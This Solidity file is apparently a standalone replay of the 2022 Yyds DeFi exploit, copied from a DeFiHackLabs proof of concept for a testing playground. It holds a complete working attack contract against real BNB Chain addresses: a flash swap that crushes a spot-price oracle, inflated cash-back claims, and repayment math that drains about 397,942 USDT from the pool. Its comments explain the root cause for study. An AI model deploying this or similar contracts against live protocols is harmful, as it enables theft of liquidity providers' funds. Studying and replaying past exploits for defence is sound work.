// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-09-Yyds).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the PancakeSwap flash-swap callback `pancakeCall` lives on the test itself,
// so there is no standalone contract to deploy). This contract is a faithful,
// self-contained copy of that inline attack (testExploit body + pancakeCall
// callback), so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from 2022-09-Yyds_exp/test/Yyds_exp.sol.
//
// Root cause: consumptionReturnPool.getPriceOfUSDT() derives the USDT/YYDS
// price from the PancakeSwap pair's SPOT balances (balanceOf), which a flash
// swap can crush inside one transaction. The cash-back payout
// (yydsAmount = return * 1e18 / price) is inflated by the same factor the
// oracle is crushed, so a 0.51 USDT entitlement mints 844.56 YYDS. Dumping
// that YYDS back into the pair to settle the flash swap leaves the attacker
// ~397,942 USDT of the pool's honest liquidity.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IUniPair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IClaim {
    function claim(address) external;
}

interface IWithdraw {
    function withdrawReturnAmountByMerchant() external;
    function withdrawReturnAmountByConsumer() external;
    function withdrawReturnAmountByReferral() external;
}

contract YydsDrain {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 YYDS = IERC20(0xB19463ad610ea472a886d77a8ca4b983E4fAf245);
    IUniPair Pair = IUniPair(0xd5cA448b06F8eb5acC6921502e33912FA3D63b12);
    IClaim targetClaim = IClaim(0xe70cdd37667cdDF52CabF3EdabE377C58FaE99e9);
    IWithdraw targetWithdraw = IWithdraw(0x970A76aEa6a0D531096b566340C0de9B027dd39D);

    // Captured in run() before the flash swap so the repayment math (mirroring
    // the original test) can use the pre-manipulation reserves.
    uint256 reserve0;
    uint256 reserve1;

    function run() external {
        (reserve0, reserve1,) = Pair.getReserves();
        // Flash-borrow ~all of the pair's USDT, draining the reserve to 1 USDT.
        uint256 amount0Out = USDT.balanceOf(address(Pair));
        Pair.swap(amount0Out - 1 * 1e18, 0, address(this), new bytes(1));
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        // Inside the flash-swap callback the pair holds only 1 USDT, so the
        // consumptionReturnPool oracle is crushed ~1.18Mx. Claim the (tiny)
        // accrued referral cash-back, now priced against the crushed oracle —
        // it mints 844.56 YYDS instead of the fair 0.00071 YYDS.
        targetClaim.claim(address(this));
        try targetWithdraw.withdrawReturnAmountByReferral() {} catch {}
        try targetWithdraw.withdrawReturnAmountByMerchant() {} catch {}
        try targetWithdraw.withdrawReturnAmountByConsumer() {} catch {}

        // Repay the flash swap: send the freshly-minted YYDS back into the
        // pair, then compute the constant-product USDT repayment and send it.
        uint256 yydsInContract = YYDS.balanceOf(address(this));
        YYDS.transfer(address(Pair), yydsInContract);
        uint256 yydsInPair = YYDS.balanceOf(address(Pair));
        uint256 amountUsdt =
            (reserve0 * reserve1 / ((yydsInPair * 10_000 - yydsInContract * 25) / 10_000)) / 9975 * 10_000;
        USDT.transfer(address(Pair), amountUsdt);
    }
}
